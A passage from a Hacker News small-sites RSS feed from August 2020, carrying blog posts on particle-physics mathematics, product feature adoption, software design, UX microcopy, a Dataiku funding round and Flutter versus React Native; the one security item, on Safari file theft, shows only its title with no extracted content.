<p>In August 2020,&nbsp;Mizera, Mastrolia and colleagues published&nbsp;<a href="https://arxiv.org/abs/2008.04823" target="_blank">another preprint</a>&nbsp;showing that the technique has matured enough to handle real-world two-loop diagrams. A forthcoming paper by Caron-Huot will push the method further, perhaps bringing three-loop diagrams to heel.</p>
<p>If successful, the technique could help usher in the next generation of theoretical predictions. And, a few researchers suspect, it may even foreshadow a new perspective on reality.</p>

<ul><li> is a journalist covering developments in the physical sciences both on and off the planet. His work has appeared in <span>Scientific American, The Christian Science Monitor</span> and <span>LiveScience</span>, among other publications. Previously, he taught physics and English in Mozambique and Japan, and he has a bachelorâ€™s in physics from Brown University.</li></ul>
<p>Lead image:&nbsp;<a href="https://www.istockphoto.com/video/animation-of-particles-collision-in-hadron-collider-astrophysics-concept-gm1151477191-312085198" target="_blank" rel="noreferrer nofollow" data-is-link="https://www.istockphoto.com/video/animation-of-particles-collision-in-hadron-collider-astrophysics-concept-gm1151477191-312085198">vchal</a></p>
<p>Video: The brilliant physicist Richard Feynman devised a system of line drawings that simplified calculations of particle interactions and helped rescue the field of quantum electrodynamics.&nbsp;Directed by&nbsp;<a href="http://www.bonscifilms.com/" target="_blank">Emily Driscoll</a>&nbsp;and animated by&nbsp;<a href="http://metteilene.com/" target="_blank">Mette Ilene Holmriis&nbsp;</a>for Quanta Magazine.<br></p>





                    <p>Reprinted with permission from <a href="https://www.quantamagazine.org/">Quanta Magazine</a>'s <a href="https://www.quantamagazine.org/category/abstractions/">Abstractions blog</a>.</p>
            </article></div>]]>
            </description>
            <link>http://abstractions.nautil.us/article/606/the-mathematical-structure-of-particle-collisions-comes-into-view</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270579</guid>
            <pubDate>Tue, 25 Aug 2020 12:23:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Low adoption of features and the sad realization]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270576">thread link</a>) | @damandloi
<br/>
August 25, 2020 | https://agyam.com/low-adoption-and-sad-realization/ | <a href="https://web.archive.org/web/*/https://agyam.com/low-adoption-and-sad-realization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><main id="main" role="main"> <article id="post-778"><div><div><p>Early in my career, I used to get so excited from hearing client’s complaints that I would instantly start to conceptualize solutions and put them in the backlog, ready to be discussed and pushed in the roadmap. Only later, I started realizing that none of the solutions were getting used as much as I had thought. It would break my heart – How can something I believed in so strongly would not get used by customers?</p><figure><img loading="lazy" width="700" height="467" src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash.jpg?resize=700%2C467&amp;ssl=1" alt="New feature, no usage" srcset="https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1536%2C1024&amp;ssl=1 1536w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=2048%2C1365&amp;ssl=1 2048w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=434%2C289&amp;ssl=1 434w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=868%2C579&amp;ssl=1 868w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1736%2C1157&amp;ssl=1 1736w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?w=1400&amp;ssl=1 1400w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?w=2100&amp;ssl=1 2100w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1536%2C1024&amp;ssl=1 1536w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=2048%2C1365&amp;ssl=1 2048w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=434%2C289&amp;ssl=1 434w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=868%2C579&amp;ssl=1 868w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?resize=1736%2C1157&amp;ssl=1 1736w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?w=1400&amp;ssl=1 1400w, https://i1.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash-scaled.jpg?w=2100&amp;ssl=1 2100w" data-lazy-src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/jonas-jacobsson-2xaF4TbjXT0-unsplash.jpg?resize=700%2C467&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure><p>I would also try for all sorts of marketing tactics to make it noticeable to users, only to find temporary blip in the adoption. And, when the adoption rate reverts to the mean or does not show significant improvement, I would be worried about its impact on my performance evaluation and promotion.</p><p>After going to multiple phases of this sad realization of low adoption rates, here is how I now think about it:</p><p><strong>Building for adoption</strong></p><ul><li>Customers tell the right problem, but never the right solution.</li><li>Understanding the problem without the context won’t help in adoption. We should not build what the customers have asked or wanted to tell, but what helps them do their job.</li><li>If building what customers did not even know they needed, make sure they have a great experience with the aha moment.</li></ul><p><strong>Increasing adoption</strong></p><ul><li>Guestimate an adoption rate, and keep working towards it after the initial release. No feature/product is perfect in the first release.</li><li>Make a conscious decision of working towards increasing adoption or building a new feature. Sometimes a feature can increase the adoption of a product, and sometimes that feature won’t even get used for the low adoption of the product. Know the minimum feature set required for adoption.</li><li>Recognize that problem lies somewhere else if adoption isn’t increasing after multiple efforts.</li></ul><p><strong>Not all features are equal</strong></p><ul><li>Adoption seems to have an inverse relationship with the type of clients your product has.</li></ul><figure><img loading="lazy" width="700" height="487" src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=700%2C487&amp;ssl=1" alt="" srcset="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=1024%2C713&amp;ssl=1 1024w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=300%2C209&amp;ssl=1 300w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=768%2C535&amp;ssl=1 768w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=434%2C302&amp;ssl=1 434w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=868%2C604&amp;ssl=1 868w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?w=1257&amp;ssl=1 1257w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=1024%2C713&amp;ssl=1 1024w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=300%2C209&amp;ssl=1 300w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=768%2C535&amp;ssl=1 768w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=434%2C302&amp;ssl=1 434w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=868%2C604&amp;ssl=1 868w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?w=1257&amp;ssl=1 1257w" data-lazy-src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=700%2C487&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Small clients can easily adopt whereas enterprises take their own time.</figcaption></figure><ul><li>It is ok to have some features build for limited enterprise clients having a disproportionate ratio of product revenue. However, only if the team agrees on the tradeoffs of increased complexity and tech debt.</li><li>Feature adoption also seems to have an inverse relationship with the depth of the product. Features for advanced users can be good differentiators and add to the marketing arsenal, but they remain least used.</li></ul><p><strong>Adoption is breaking inertia</strong></p><ul><li>Customers become habitual to their flows and often ignore new features. We need to break their inertia by making them realize the value and reducing the effort required.</li><li>Consider adoption as an onboarding strategy:<ul><li>`Attract them with multi-channel launch announcements</li><li>Interest them with contextual nudges and making it easy to find</li><li>Increase desire with use cases and testimonials</li><li>Reduce anxiety with upfront help</li><li>Make it easy to perform an action or use the feature</li></ul></li></ul><figure><blockquote><p>Adoption is breaking inertia. It happens when users realize the value outweighs the efforts invested.</p></blockquote></figure><ul><li>For features that increase the overall product value, keep educating customers until new habits are formed. For advanced and specific features, hide them slowly to make way for new features.</li></ul><p>As years go by, I started realizing another truth – Adoption is necessary but not a sufficient condition for the product’s success.</p><hr><pre>Image by <a href="https://unsplash.com/@jonasjacobsson?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Jonas Jacobsson</a>.

* These pointers are applicable equally for feature and product adoption.</pre></div> </div> <nav> « <a href="https://agyam.com/good-product-manager-bad-product-manager/" rel="prev">Good Product Manager and Bad Product Manager by Ben Horowitz</a> </nav></article></main></div></div>]]>
            </description>
            <link>https://agyam.com/low-adoption-and-sad-realization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270576</guid>
            <pubDate>Tue, 25 Aug 2020 12:22:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't marry your design after the first date]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270554">thread link</a>) | @todsacerdoti
<br/>
August 25, 2020 | https://tomgamon.com/posts/2020-08-25-dont-marry-your-design/ | <a href="https://web.archive.org/web/*/https://tomgamon.com/posts/2020-08-25-dont-marry-your-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Prudent dating advice would be to get to know someone first, before making an everlasting commitment to them. The same advice holds when designing software systems. Don’t marry yourself to your design decisions before at least getting to learn more about them first. Once you have learned their quirks and seen how they act under pressure, you can make a much more informed decision about whether you want to commit. When I am designing new software from scratch I often think about this quote from Uncle Bob.</p><div><blockquote><p>Good architecture allows major architectural decisions to be deferred. The job of an architect is not to make decisions, but to defer those decisions for as long as possible, To allow the program to be built in the absence of decisions so that decisions can be made later with the most possible information</p></blockquote></div><p>At the point you start a new project, you have the least amount of possible knowledge about that project. As The Project Paradox states, this is the worst possible time to be committing to major decisions.</p><blockquote><p lang="en" dir="ltr">The project paradox: making the biggest decisions when knowledge is at it's absolute lowest. <a href="https://t.co/b7zBa4Aq7m">pic.twitter.com/b7zBa4Aq7m</a></p>— Tobias Fors (@tofo) <a href="https://twitter.com/tofo/status/512666251055742977?ref_src=twsrc%5Etfw">September 18, 2014</a></blockquote><p>The more time you spend in the problem space, the more information you can gather and the better decision you can make when the time comes. For example, you can probably start working on your domain logic without knowing how the data is going to be served to the client, or what particular flavour of database you are going to use. Once you have chosen a database, by carefully encapsulating the access logic, if it turns out that this database isn’t the one, it is much easier to part ways amicably.</p><p>Structure your code in such a way that you don’t have to commit to major decisions up front, and perhaps you too can live happily ever after.</p></section></div>]]>
            </description>
            <link>https://tomgamon.com/posts/2020-08-25-dont-marry-your-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270554</guid>
            <pubDate>Tue, 25 Aug 2020 12:19:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Practical tips for better microcopy]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24270552">thread link</a>) | @jrdnbwmn
<br/>
August 25, 2020 | https://learnuxd.io/posts/7-practical-tips-for-better-microcopy/ | <a href="https://web.archive.org/web/*/https://learnuxd.io/posts/7-practical-tips-for-better-microcopy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
        
        <p>Good microcopy is one of the fastest ways to improve an interface. Try doing an audit on your UI with these tips to see how it stands up.</p>

<h2 id="1-use-personal-pronouns">1) Use personal pronouns</h2>

<p>Address the reader instead of just talking out loud. Use the word <em>you</em>. People pay more attention when you talk directly to them.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post1.png">
</figure>

<h2 id="2-start-with-a-verb">2) Start with a verb</h2>

<p>Names for interactive elements should begin with an action verb. The same goes for important copy. Starting with a verb is more direct and engaging.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post2.png">
</figure>

<h2 id="3-prevent-concerns">3) Prevent concerns</h2>

<p>Point out concerning actions before your user can worry about your motives. Be transparent<span>—</span>make sure they understand what they’re doing and why.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post3.png">
</figure>

<h2 id="4-use-natural-language">4) Use natural language</h2>

<p>Write conversationally, like you’re one-on-one. Be professional but get rid of jargon. Use familiar, simple words with a friendly, relaxed tone.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post4.png">
</figure>

<h2 id="5-default-to-active-voice">5) Default to active voice</h2>

<p>Most of the time, active voice is the way to go. It’s easier to understand than passive voice, feels more personal, and is often shorter and stronger.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post5.png">
</figure>

<h2 id="6-show-useful-error-messages">6) Show useful error messages</h2>

<p>Avoid negative, threatening, or overly technical words. Be friendly, show empathy, take the time to explain what’s going on, and be helpful.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post6.png">
</figure>

<h2 id="7-write-iteratively">7) Write iteratively</h2>

<p>We write code iteratively, so why everything else? Things probably won’t be perfect the first time around. Test, refine, ship again. It adds up.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post7.png">
</figure>

<p>Thanks for reading. If you enjoyed the article, sharing on Twitter is really appreciated:</p>

<div>
    <div>
        <blockquote><div lang="en" dir="ltr"><p>Good microcopy is one of the fastest ways to improve an interface. </p><p>Try doing an audit on your UI with these tips to see how it stands up. 👇 <a href="https://t.co/DqRSmVTIvt">pic.twitter.com/DqRSmVTIvt</a></p></div>— Learn UXD (@learn_uxd) <a href="https://twitter.com/learn_uxd/status/1298228761771552773?ref_src=twsrc%5Etfw">August 25, 2020</a></blockquote> 
    </div>
</div>


    </article></div>]]>
            </description>
            <link>https://learnuxd.io/posts/7-practical-tips-for-better-microcopy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270552</guid>
            <pubDate>Tue, 25 Aug 2020 12:19:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing local files using Safari Web Share API]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24270538">thread link</a>) | @doener
<br/>
August 25, 2020 | https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html | <a href="https://web.archive.org/web/*/https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270538</guid>
            <pubDate>Tue, 25 Aug 2020 12:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free fantasy books well worth reading]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270517">thread link</a>) | @pavelegorkin
<br/>
August 25, 2020 | https://bookpub.club/post/10-free-fantasy-books-well-worth-reading-1598356560236x990698759299006500 | <a href="https://web.archive.org/web/*/https://bookpub.club/post/10-free-fantasy-books-well-worth-reading-1598356560236x990698759299006500">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bookpub.club/post/10-free-fantasy-books-well-worth-reading-1598356560236x990698759299006500</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270517</guid>
            <pubDate>Tue, 25 Aug 2020 12:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dataiku Raises $100M In Series D Funding]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270513">thread link</a>) | @yadavrohit
<br/>
August 25, 2020 | https://www.analyticsdrift.com/dataiku-raises-100m-in-series-d-funding/ | <a href="https://web.archive.org/web/*/https://www.analyticsdrift.com/dataiku-raises-100m-in-series-d-funding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                    <!-- .entry-header -->

                
                        <div>
                                    <p><img width="1024" height="536" src="https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?fit=1024%2C536&amp;ssl=1&amp;is-pending-load=1" alt="dataiku series d" loading="lazy" data-lazy-srcset="https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?w=1200&amp;ssl=1 1200w, https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?resize=300%2C157&amp;ssl=1 300w, https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?resize=1024%2C536&amp;ssl=1 1024w, https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?resize=768%2C402&amp;ssl=1 768w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i2.wp.com/www.analyticsdrift.com/wp-content/uploads/2020/08/dataiku-series-d.png?fit=1024%2C536&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">                </p>
            
                                            </div>

            

        <!-- end slider-section -->
                                    

    <div>
        <div>
            
<p>Dataiku <a href="https://blog.dataiku.com/dataiku-series-d-fueling-the-future-of-enterprise-ai" target="_blank" rel="noreferrer noopener">announced</a> that it raised $100 million Series D funding for enhancing the platform to empower different data-driven firms to leverage data effectively. Lead by Stripes with Tiger Global Management and joined by existing investors Battery Ventures, CapitalG, Dawn Capital, FirstMark Capital, and ICONIQ. In December 2019, Dataiku was valued at $1.4 billion when Alphabet’s investment firm CapitalG poured money into the company.</p>



<p>In an attempt to democratize Enterprise AI, Dataiku is committed to explore new opportunities and include functionalities in its end-to-end data science platform. There is a sudden change in people behaviour, which has forced organizations to transform the delivery of services and products.</p>



<p><strong>Also Read:</strong> <a href="https://www.analyticsdrift.com/amazon-makes-its-machine-learning-course-free-for-all/" target="_blank" rel="noreferrer noopener">Amazon Makes Its Machine Learning Course Free For All</a></p>



<p>Dataiku wants to capitalize on the opportunity by allowing companies to bring resilience in the difficult times caused by COVID-19 with its robust platform. The firm already enables users to collaborate for data science projects, code to click, model development, model prediction, and model deployment.</p>



<p>Founded in 2013, today, the company has more than 450 employees, 300 customers, and partners around the globe. Due to its feature-rich Dataiku platform, the company has quickly gained traction in the data science domain.</p>



<figure><blockquote><p>I suspect in ten years we won’t be using spreadsheets</p><cite>Florian Douetteau, CEO of Dataiku</cite></blockquote></figure>



<p>Currently, Dataiku’s significant competitors are Alteryx, Databricks, and more, which have made reasonable grounds in the self-service analytics domain. All these platforms, including Dataiku, are working towards democratizing data by allowing users to get insight into information without programming skills.</p>



<p>According to Dataiku, with this Series D funding, the company will continue to simplify its platform for organizations to have hundreds, thousands, or hundreds of thousands of machine learning models in production.</p>
                <div>
                    
                                        
        <div>

                <p><a href="https://www.analyticsdrift.com/author/analyticsdriftgmail-com/"><img alt="" src="https://secure.gravatar.com/avatar/b4013be20eaee509a78cd792d7474854?s=150&amp;r=g" srcset="https://secure.gravatar.com/avatar/b4013be20eaee509a78cd792d7474854?s=300&amp;r=g 2x" height="150" width="150" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a>
                </p>
                
        </div>

                                            </div>
                                            
                        
	<nav role="navigation" aria-label="Continue Reading">
		<h2>Continue Reading</h2>
		
	</nav>                    </div><!-- .entry-content -->
    </div>
                        </div></div>]]>
            </description>
            <link>https://www.analyticsdrift.com/dataiku-raises-100m-in-series-d-funding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270513</guid>
            <pubDate>Tue, 25 Aug 2020 12:11:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flutter vs. React Native, writing an app with each one: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270496">thread link</a>) | @pixo
<br/>
August 25, 2020 | https://pixo.sh/flutter-vs-react-native-an-app-with-each-one-part-1/ | <a href="https://web.archive.org/web/*/https://pixo.sh/flutter-vs-react-native-an-app-with-each-one-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure><img loading="lazy" width="1024" height="675" src="https://pixo.sh/wp-content/uploads/flutter-vs-react-native-1024x675.jpg" alt="Flutter vs React Native" srcset="https://pixo.sh/wp-content/uploads/flutter-vs-react-native-1024x675.jpg 1024w, https://pixo.sh/wp-content/uploads/flutter-vs-react-native-300x198.jpg 300w, https://pixo.sh/wp-content/uploads/flutter-vs-react-native-768x506.jpg 768w, https://pixo.sh/wp-content/uploads/flutter-vs-react-native.jpg 1489w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Flutter vs React Native, two widely used cross platform tools, but what should I use?. In this “experiment”, Im going to try to develop the same app, in both frameworks, the goal is to spot differences between them.</p>
<p>No framework is better than the other, they work in different ways, and they fit different developer requirements</p>
<h2>Main differences</h2>
<p>For me the main difference between them, is that React Native run using a Javascript bridge, while Flutter is compiled to native code. This is strictly reflected in the performance of each one.</p>
<figure><table><tbody><tr><td></td><td>Flutter</td><td>React Native</td></tr><tr><td>Language</td><td>Dart</td><td>Javascript</td></tr><tr><td>Compiles native code</td><td>Yes</td><td>No</td></tr><tr><td>Maintained by</td><td>Google</td><td>Facebook</td></tr></tbody></table></figure>
<h2>What im going to build and test</h2>
<p>I will write an app in both frameworks, will be a simple app using the <a aria-label="Rick and Morty API (opens in a new tab)" href="https://rickandmortyapi.com/" target="_blank" rel="noreferrer noopener">Rick and Morty API</a>.</p>
<p>I’m going to test:</p>
<p>Part 1</p>
<ul><li>How fast is to install each framework create and run an app</li><li>Reloading time, both frameworks have hot reloading, a fast one is needed for a seamlessly development workflow</li><li>Development experience, which one offers a better development experience</li></ul>
<p>Part 2</p>
<ul><li>Writing the app in React Native</li><li>Writing the app in Flutter</li></ul>
<p>Part 3</p>
<ul><li>Testability, how easy is to test each app</li><li>Stress test and benchmarking </li></ul>
<h2>Installing Flutter and React Native</h2>
<p>Before I start, i have already installed in my computer Android Studio and Xcode, since they are not related directly to any framework, I won’t include their installation process.</p>
<h3>Flutter process</h3>
<ol><li>Install the <a aria-label="Flutter SDK (opens in a new tab)" href="https://flutter.dev/docs/get-started/install" target="_blank" rel="noreferrer noopener">Flutter SDK</a> (2min)</li><li>Add the Flutter SDK PATH (20s)</li><li>Create the app with flutter create (1min)</li></ol>
<p>The whole process to install Flutter took me 3 minutes, not including the downloading time, also Flutter provides a tool called flutter doctor, which for first installs is really useful it scans our system to check if we have all the needed tools for flutter development (Xcode, Android Studio, Dart plugins, VScode extensions…)</p>
<h3>React Native process</h3>
<p>You can use Expo, but I will use React Native CLI</p>
<ol><li>Install Node.js (3min)</li><li>Install watchman (2min</li><li>Create our app with typescript support (2min)</li></ol>
<p>Total time, 7 mins, and i needed to fix my nvm versions, also first build took about 3 minutes to start.</p>
<p>The Flutter installation process was smoother and faster than the React Native one, probably because RN needs to deal with Node.js under the hood…</p>
<h2>Development experience</h2>
<h3>Hot reloading</h3>
<p>Hot reloading is a must feature for me in web and app development, both, React Native and Flutter have the same feature.</p>
<p>I tested both with the default app which each framework creates</p>
<p>Flutter took 47ms to hot reload the app</p>
<p>React Native took 630ms, because it needs to compile javascript and inject it again with Metro.</p>
<p>Also a note on this, Flutter hot reloading only worked for me if I run my app from VScode, if i run the flutter app from an external terminal, the <strong>automatic hot reloading</strong> doesn’t work, I need to type r to hot reload the app, while in React Native you only need to save the file. I guess this is the only tradeoff. </p>
<h3>Extensions</h3>
<p>I installed Flutter extension for VScode, which is very recommended from the dev team. It adds an extension icon in your sidebar, and you can view your project structure from that tab.</p>
<p>For React Native I added React Native Tools, you can run React Native commands directly from your VScode command palette, but if you run your app from a terminal i don’t find it very useful</p>
<h3>Debugging</h3>
<p>Both frameworks come with their own debugging tools, however, for me Flutter ones are more useful.</p>
<p>One thing I don’t like about React Native debugger is that you can’t see directly your network requests, you need to do some tweaks in order to do that, you can see more info about that <a aria-label="here (opens in a new tab)" href="http://One thing I don't like about React Native debugger is that you can't see directly your network requests, you need to do some tweaks in order to do that, you can see more info about that here" target="_blank" rel="noreferrer noopener">here</a></p>
<p>Here you can see each one debugger GUI</p>
<p>React Native:</p>
<figure><img loading="lazy" width="1024" height="611" src="https://pixo.sh/wp-content/uploads/react-native-debugger-1024x611.png" alt="Flutter vs React Native: React Native debugger" srcset="https://pixo.sh/wp-content/uploads/react-native-debugger-1024x611.png 1024w, https://pixo.sh/wp-content/uploads/react-native-debugger-300x179.png 300w, https://pixo.sh/wp-content/uploads/react-native-debugger-768x458.png 768w, https://pixo.sh/wp-content/uploads/react-native-debugger.png 1452w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>React Native Debugger in Chrome devtools</figcaption></figure>
<p>Flutter:</p>
<figure><img loading="lazy" width="1024" height="610" src="https://pixo.sh/wp-content/uploads/dart-devtools-1024x610.png" alt="Flutter vs React Native: Dart DevTools" srcset="https://pixo.sh/wp-content/uploads/dart-devtools-1024x610.png 1024w, https://pixo.sh/wp-content/uploads/dart-devtools-300x179.png 300w, https://pixo.sh/wp-content/uploads/dart-devtools-768x458.png 768w, https://pixo.sh/wp-content/uploads/dart-devtools.png 1448w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Dart DevTools, running in Chrome</figcaption></figure>
<h2>Conclusion on Part 1</h2>
<p>In terms of development experience, Flutter is the winner for me, the whole process from 0 to app running in my emulator didn’t took more than 10 minutes.</p>
<p>With React Native, compilation took a lot of time (I’m running each one in a 16″ 2019 Macbook Pro), also i had some Node.js issues.</p>
</div></div>]]>
            </description>
            <link>https://pixo.sh/flutter-vs-react-native-an-app-with-each-one-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270496</guid>
            <pubDate>Tue, 25 Aug 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How We’re Able to Host 1M Sites per MongoDB Cluster]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270294">thread link</a>) | @MoradSTR
<br/>
August 25, 2020 | https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster | <a href="https://web.archive.org/web/*/https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster">archive.org</a>
